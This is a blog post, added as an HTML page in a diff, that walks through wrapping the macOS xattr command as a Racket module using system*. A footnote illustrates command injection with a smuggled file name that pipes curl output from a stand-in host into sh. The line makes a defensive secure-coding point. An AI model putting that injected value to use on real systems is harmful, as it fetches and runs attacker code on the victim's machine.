@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Wrapping xattr as a racket module – jverkamp.com</title>
+
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8"><link rel="alternate" type="application/atom+xml" title="jverkamp.com (Atom 2.0)" href="//blog.jverkamp.com/feed/">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.9.0-alpha2/katex.min.css" integrity="sha384-exe4Ak6B0EoJI0ogGxjJ8rn+RN3ftPnEQrGwX59KTCl5ybGzvHGKjhPKk/KC3abb" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bigfoot/2.1.4/bigfoot-default.min.css" integrity="sha256-s0KLB0LnI5oqhHF8gkgfmxU4usUFEHlWJTxT8q72Tq4=" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous" />
+
+<link href="https://fonts.googleapis.com/css?family=Spectral+SC|Lato|Share+Tech+Mono" rel="stylesheet">
+
+<link rel="stylesheet" href="/custom.css" defer />
+
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+</head>
+<body>
+    <div id="wrapper"><header id="page-header" role="banner">
+    <h1><a href="/">JP's Blog</a></h1>
+
+    <ul id="page-header-links">
+        <li>
+            <a href="https://twitter.com/jpverkamp">Twitter</a> *
+            <a href="https://github.com/jpverkamp">GitHub</a> *
+            <a href="https://www.flickr.com/photos/jpverkamp">Flickr</a>
+        </li>
+        <li>
+            <form action="//www.google.com/search" method="get" onsubmit="(function(obj){obj.q.value='site:blog.jverkamp.com '+obj.qfront.value;})(this)" class="navbar-form navbar-right" role="search" _lpchecked="1">
+                <div class="form-group">
+                    <input name="q" type="hidden">
+                    <input name="qfront" type="text" class="form-control" placeholder="Search">
+                    <button type="submit" class="btn btn-default" value="Search">Search</button>
+                </div>
+            </form>
+        </li>
+
+    </ul>
+
+    <nav id="header-navigation" role="navigation" class="ribbon">
+        <ul class="main-navigation"><li><a href="https://blog.jverkamp.com/programming/">Programming</a></li><li><a href="https://blog.jverkamp.com/reviews/">Reviews</a></li><li><a href="https://blog.jverkamp.com/writing/">Writing</a></li><li><a href="https://blog.jverkamp.com/photography/">Photography</a></li><li><a href="https://blog.jverkamp.com/research/">Research</a></li><li class="subscription" data-subscription="rss"><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+        </ul>
+    </nav>
+</header>
+<div id="page-content-wrapper">
+            <div id="page-content"><article>
+	<header>
+		<h1 class="entry-title">Wrapping xattr as a racket module</h1>
+
+        <div class="entry-meta"><span class="entry-date">2020-01-29</span>
+            </div><div class="entry-tags"><ul class="taxonomy-keys"><li>
+            <a class="taxonomy-key" href="/programming/languages/">Languages</a>
+            <ul class="taxonomy-values"><li><a href="https://blog.jverkamp.com/2018/12/14/aoc-2018-day-14-functionally-circular-elfs/" class="previous-link"></a><a class="taxonomy-value" href="/programming/languages/racket">Racket</a></li></ul>
+        </li><li>
+            <a class="taxonomy-key" href="/programming/topics/">Topics</a>
+            <ul class="taxonomy-values"><li><a class="taxonomy-value" href="/programming/topics/filesystems">Filesystems</a></li></ul>
+        </li><li><a class="taxonomy-key" href="/programming">programming</a>
+            <ul>
+                <li><a href="https://blog.jverkamp.com/2020/01/16/rackcors-configuration-tricks/" class="previous-link">Prev</a>
+                </ul>
+        </li><li><a class="taxonomy-key" href="/">All Posts</a>
+            <ul>
+                <li><a href="https://blog.jverkamp.com/2020/01/28/frog-and-toad-storybook-treasury-4-complete-stories-in-1-volume/" class="previous-link">Prev</a>
+                </ul>
+        </li></ul>
+</div>
+</header>
+
+	<div class="entry-content"><p>I recently came across a question: how do you read <a href="https://en.wikipedia.org/wiki/extended%20file%20attributes">extended file attributes</a> in Racket. Not being actually that familiar with extended file attributes, I searched online. Nothing seems to currently exist (other than <a href="https://docs.racket-lang.org/fuse/index.html#%28def._%28%28lib._fuse%2Fmain..rkt%29._setxattr%29%29">in the FUSE module, but that&rsquo;s specific to FUSE</a>), but there is a system level exectuable that one could wrap to do this. I haven&rsquo;t done <i>much</i><sup class="footnote-ref" id="fnref:much"><a href="#fn:much">1</a></sup> with Racket&rsquo;s <code><a href="http://docs.racket-lang.org/search/index.html?q=system">system</a></code>
+ or <code><a href="http://docs.racket-lang.org/search/index.html?q=system*">system*</a></code>
+ function before, so let&rsquo;s give it a whirl.</p>
+
+<p>First (and doing most of the work), let&rsquo;s take a look at the <code>xattr</code> function&rsquo;s <a href="https://en.wikipedia.org/wiki/man%20page">man page</a>:</p>
+
+<pre style="overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;">
+NAME
+    xattr -- display and manipulate extended attributes
+
+SYNOPSIS
+    xattr [-lrsvx] file ...
+    xattr -p [-lrsvx] attr_name file ...
+    xattr -w [-rsx] attr_name attr_value file ...
+    xattr -d [-rsv] attr_name file ...
+    xattr -c [-rsv] file ...
+    xattr -h | --help
+
+DESCRIPTION
+    The xattr command can be used to display, modify or remove the extended attributes of one or more files, including directories and symbolic links.  Extended attributes are arbitrary metadata stored with a file, but separate from the filesystem attributes (such as modification time or file size).  The metadata is often a null-terminated UTF-8 string, but can also be arbitrary binary data.
+
+    One or more files may be specified on the command line.  For the first two forms of the command, when there are more than one file, the file name is displayed along with the actual results. When only one file is specified, the display of the file name is usually suppressed (unless the -v option described below, is also specified).
+
+    In the first form of the command (without any other mode option specified), the names of all extended attributes are listed.  Attribute names can also be displayed using ``ls -l@''.
+
+    In the second form, using the -p option (``print''), the value associated with the given attribute name is displayed.  Attribute values are usually displayed as strings.  However, if nils are detected in the data, the value is displayed in a hexadecimal representation.
+
+    The third form, with the -w option (``write''), causes the given attribute name to be assigned the given value.
+
+    The fourth form, with the -d option (``delete''), causes the given attribute name (and associated value), to be removed.
+
+    In the fifth form, with the -c option (``clear''), causes all attributes (including their associated values), to be removed.
+</pre>
+
+<p>So that is the functionality we will want to wrap. For my first attempt, we&rsquo;ll just read the values.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-racket" data-lang="racket">&gt; (<span style="color:#66d9ef">define</span> (xattr-list <span style="color:#66d9ef">file</span>)
+    (system* (find-executable-path <span style="color:#e6db74">&#34;xattr&#34;</span>) <span style="color:#66d9ef">file</span>))
+
+&gt; (xattr-list <span style="color:#e6db74">&#34;xattr.rkt&#34;</span>)
+com.apple.FinderInfo
+com.apple.metadata:_kMDItemUserTags</code></pre></div>
+<p>As I did before, I could use <code>(system (format &quot;xattr ~a&quot; file))</code> but I&rsquo;ve grown a lot as a developer with a focus on security since then. And one thing I&rsquo;ve learned that can cause no end of trouble is using string formatting to build system commands. Just don&rsquo;t do it<sup class="footnote-ref" id="fnref:example"><a href="#fn:example">2</a></sup>. In Racket, use <code><a href="http://docs.racket-lang.org/search/index.html?q=system*">system*</a></code>
+. It will take each argument as a parameter and you don&rsquo;t have to worry about properly escaping things.</p>
+
+<p>A good start, but I really want a list. To do that, we&rsquo;ll need to capture the output from <code>system*</code> into a string. Luckily, Racket is good at that:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-racket" data-lang="racket">&gt; (<span style="color:#66d9ef">define</span> (xattr-list <span style="color:#66d9ef">file</span>)
+    (with-output-to-string
+      (<span style="color:#66d9ef">thunk</span>
+       (system* (find-executable-path <span style="color:#e6db74">&#34;xattr&#34;</span>) <span style="color:#66d9ef">file</span>))))
+
+&gt; (xattr-list <span style="color:#e6db74">&#34;xattr.rkt&#34;</span>)
+<span style="color:#e6db74">&#34;com.apple.FinderInfo</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">com.apple.metadata:_kMDItemUserTags</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span></code></pre></div>
+<p>And then to pull it apart:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-racket" data-lang="racket">&gt; (<span style="color:#66d9ef">define</span> (xattr-list <span style="color:#66d9ef">file</span>)
+    (string-split
+     (with-output-to-string
+       (<span style="color:#66d9ef">thunk</span>
+        (system* (find-executable-path <span style="color:#e6db74">&#34;xattr&#34;</span>) <span style="color:#66d9ef">file</span>)))
+     <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
+
+&gt; (xattr-list <span style="color:#e6db74">&#34;xattr.rkt&#34;</span>)
+<span style="color:#f92672">&#39;</span>(<span style="color:#e6db74">&#34;com.apple.FinderInfo&#34;</span> <span style="color:#e6db74">&#34;com.apple.metadata:_kMDItemUserTags&#34;</span>)</code></pre></div>
+<p>Nice.</p>
+
+<p>That actually deals with the &ldquo;\n&rdquo; that&rsquo;s naturally at the end of the output&ndash;and that saw an example ago&ndash;properly, but we&rsquo;ll have to deal with that ourselves later.</p>
+
+<p>Now, we copy this a number of time over and over for each of the functions, but that seems like a waste. Instead, let&rsquo;s abstract calling <code>xattr</code> in general:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-racket" data-lang="racket">(<span style="color:#66d9ef">define</span> xattr
+  (<span style="color:#66d9ef">let</span> ([exe (find-executable-path <span style="color:#e6db74">&#34;xattr&#34;</span>)])
+    (<span style="color:#66d9ef">λ</span> args
+      (string-trim
+       (with-output-to-string
+         (<span style="color:#66d9ef">thunk</span>
+          (apply system* (cons exe args))))
+       <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+       <span style="color:#66d9ef">#:left?</span> <span style="color:#66d9ef">#f</span>
+       <span style="color:#66d9ef">#:right?</span> <span style="color:#66d9ef">#t</span>
+       <span style="color:#66d9ef">#:repeat?</span> <span style="color:#66d9ef">#f</span>))))</code></pre></div>
+<p>Here, I&rsquo;m using two tricks. The <code>let</code> is within the <code>define</code>, so it can&rsquo;t be seen outside of the function, but it&rsquo;s also only evaluated once. Then <code>(λ args ...</code>, instead of the more common <code>(λ (args) ...</code> means that all of the parameters will be put together into a list.</p>
+
+<p>Then, deep into the function, we add the function executable and <code><a href="http://docs.racket-lang.org/search/index.html?q=apply">apply</a></code>
+ <code>system*</code> to it in order to deal with arbitrarily many arguments, much the same way <code>system*</code> itself does.</p>
+
+<p>Using this, we can directly replicate the <code>xattr-list</code> function:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-racket" data-lang="racket">&gt; (xattr <span style="color:#e6db74">&#34;xattr.rkt&#34;</span>)
+<span style="color:#e6db74">&#34;com.apple.FinderInfo</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">com.apple.metadata:_kMDItemUserTags&#34;</span>
+
+&gt; (string-split (xattr <span style="color:#e6db74">&#34;xattr.rkt&#34;</span>))
+<span style="color:#f92672">&#39;</span>(<span style="color:#e6db74">&#34;com.apple.FinderInfo&#34;</span> <span style="color:#e6db74">&#34;com.apple.metadata:_kMDItemUserTags&#34;</span>)</code></pre></div>
+<p>And that&rsquo;s all we&rsquo;d need. But if we want to make it a bit easier/cleaner, we can wrap the various xattr functions ourselves:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-racket" data-lang="racket">(<span style="color:#66d9ef">define</span> (xattr-list <span style="color:#66d9ef">file</span>) (string-split (xattr <span style="color:#66d9ef">file</span>) <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
+(<span style="color:#66d9ef">define</span> (xattr-read <span style="color:#66d9ef">file</span> key) (xattr <span style="color:#e6db74">&#34;-p&#34;</span> key <span style="color:#66d9ef">file</span>))
+(<span style="color:#66d9ef">define</span> (xattr-write <span style="color:#66d9ef">file</span> key value) (xattr <span style="color:#e6db74">&#34;-w&#34;</span> key value <span style="color:#66d9ef">file</span>))
+(<span style="color:#66d9ef">define</span> (xattr-delete <span style="color:#66d9ef">file</span> key) (xattr <span style="color:#e6db74">&#34;-d&#34;</span> key <span style="color:#66d9ef">file</span>))
+(<span style="color:#66d9ef">define</span> (xattr-clear <span style="color:#66d9ef">file</span>) (xattr <span style="color:#e6db74">&#34;-c&#34;</span> <span style="color:#66d9ef">file</span>))</code></pre></div>
+<p>And one more helper just in case we want to read all the keys and values into a nice <code><a href="http://docs.racket-lang.org/search/index.html?q=hash">hash</a></code>
+:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-racket" data-lang="racket">(<span style="color:#66d9ef">define</span> (xattr-read-all <span style="color:#66d9ef">file</span>)
+  (<span style="color:#66d9ef">for/hash</span> ([key (in-list (xattr-list <span style="color:#66d9ef">file</span>))])
+    (values key (xattr-read <span style="color:#66d9ef">file</span> key))))</code></pre></div>
+<p>Then we can test it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-racket" data-lang="racket">&gt; (xattr-list <span style="color:#e6db74">&#34;xattr.rkt&#34;</span>)
+<span style="color:#f92672">&#39;</span>(<span style="color:#e6db74">&#34;com.apple.FinderInfo&#34;</span> <span style="color:#e6db74">&#34;com.apple.metadata:_kMDItemUserTags&#34;</span>)
+
+&gt; (xattr-write <span style="color:#e6db74">&#34;xattr.rkt&#34;</span> <span style="color:#e6db74">&#34;hello&#34;</span> <span style="color:#e6db74">&#34;world&#34;</span>)
+<span style="color:#e6db74">&#34;&#34;</span>
+
+&gt; (xattr-read <span style="color:#e6db74">&#34;xattr.rkt&#34;</span> <span style="color:#e6db74">&#34;hello&#34;</span>)
+<span style="color:#e6db74">&#34;world&#34;</span>
+
+&gt; (xattr-read-all <span style="color:#e6db74">&#34;xattr.rkt&#34;</span>)
+<span style="color:#f92672">&#39;#hash</span>((<span style="color:#e6db74">&#34;com.apple.FinderInfo&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;...&#34;</span>)
+       (<span style="color:#e6db74">&#34;com.apple.metadata:_kMDItemUserTags&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;...&#34;</span>)
+       (<span style="color:#e6db74">&#34;hello&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;world&#34;</span>))</code></pre></div>
+<p>Nice.</p>
+
+<p>If you want the full source, you can find it on GitHub: <a href="https://github.com/jpverkamp/small-projects/blob/master/racket-libraries/xattr.rkt">xattr.rkt</a></p>
+<div class="footnotes">
+
+<hr />
+
+<ol>
+<li id="fn:much">Although I did in <a href="https://blog.jverkamp.com/2014/01/15/graph-coloring/">Graph Coloring</a> and <a href="https://blog.jverkamp.com/2014/05/21/phone-networks/">Phone Networks</a> to access GraphViz and <a href="https://blog.jverkamp.com/2015/01/29/ios-backups-in-racket-apps/">iOS Backup Apps</a> to handle parsing binary plists with <code>plutil</code>, it&rsquo;s been a while.
+ <a class="footnote-return" href="#fnref:much"><sup>[return]</sup></a></li>
+<li id="fn:example">What if the <code>file</code> was <code>.; curl evil.com | sh</code>? The command to run would end up <code>xattr .; curl evil.com | sh</code> which, as you might imagine, could do all sorts of fun things to your system.
+ <a class="footnote-return" href="#fnref:example"><sup>[return]</sup></a></li>
+</ol>
+</div></div>
+<div class="entry-comments">
+    <div id="disqus_thread"></div>
+        <script type="text/javascript">
+            var disqus_shortname = "jverkamp";
+            var disqus_title = "Wrapping xattr as a racket module";
+            var disqus_url = "https:\/\/blog.jverkamp.com\/2020\/01\/29\/wrapping-xattr-as-a-racket-module\/";
+
+             
+            (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        <a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </div></article></div>
+        </div><footer id="page-footer" role="contentinfo">
+    <nav id="footer-navigation" role="navigation" class="ribbon">
+        <ul class="main-navigation">
+            <li><a href="/archive-by-date/">All posts: By Date</a></li>
+            <li><a href="/archive-by-tag/">All posts: By Tag</a></li>
+
+            <li>
+                <a href="/atom.xml">
+                    RSS: All <sup><svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" viewBox="0 0 24 24">
+    <path fill="white" d="M6.503 20.752c0 1.794-1.456 3.248-3.251 3.248-1.796 0-3.252-1.454-3.252-3.248 0-1.794 1.456-3.248 3.252-3.248 1.795.001 3.251 1.454 3.251 3.248zm-6.503-12.572v4.811c6.05.062 10.96 4.966 11.022 11.009h4.817c-.062-8.71-7.118-15.758-15.839-15.82zm0-3.368c10.58.046 19.152 8.594 19.183 19.188h4.817c-.03-13.231-10.755-23.954-24-24v4.812z" />
+</svg>
+</sup>
+                </a>
+            </li><li>
+                <a href="/programming/atom.xml">
+                    RSS: programming<sup><svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" viewBox="0 0 24 24">
+    <path fill="white" d="M6.503 20.752c0 1.794-1.456 3.248-3.251 3.248-1.796 0-3.252-1.454-3.252-3.248 0-1.794 1.456-3.248 3.252-3.248 1.795.001 3.251 1.454 3.251 3.248zm-6.503-12.572v4.811c6.05.062 10.96 4.966 11.022 11.009h4.817c-.062-8.71-7.118-15.758-15.839-15.82zm0-3.368c10.58.046 19.152 8.594 19.183 19.188h4.817c-.03-13.231-10.755-23.954-24-24v4.812z" />
+</svg>
+</sup>
+                </a>
+            </li></ul>
+    </nav>
+
+    <div id="page-footer-content">
+        <div class="legal">
+            <p>
+                All posts unless otherwise mentioned are licensed under
+                <a rel="license" href="//creativecommons.org/licenses/by-nc-sa/3.0/deed.en_US">
+                    <img alt="Creative Commons License" style="border-width:0" src="//i.creativecommons.org/l/by-nc-sa/3.0/80x15.png">
+                </a>
+            </p>
+
+            <p>
+                Any source code unless otherwise mentioned is licensed under the <a href="//directory.fsf.org/wiki/License:BSD_3Clause">3 clause BSD license</a>
+            </p>
+        </div>
+    </div>
+</footer>
+</div><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.js" integrity="sha256-yDarFEUo87Z0i7SaC6b70xGAKCghhWYAZ/3p+89o4lE=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.9.0-alpha2/katex.min.js" integrity="sha384-OMvkZ24ANLwviZR2lVq8ujbE/bUO8IR1FdBrKLQBI14Gq5Xp/lksIccGkmKL8m+h" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bigfoot/2.1.4/bigfoot.min.js" integrity="sha256-2ylggML6rCJMc817KbE8Cx+cuxYIM+6bjG2Gpq2g7iU=" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="/custom.js" defer></script>
+</body>
+</html>
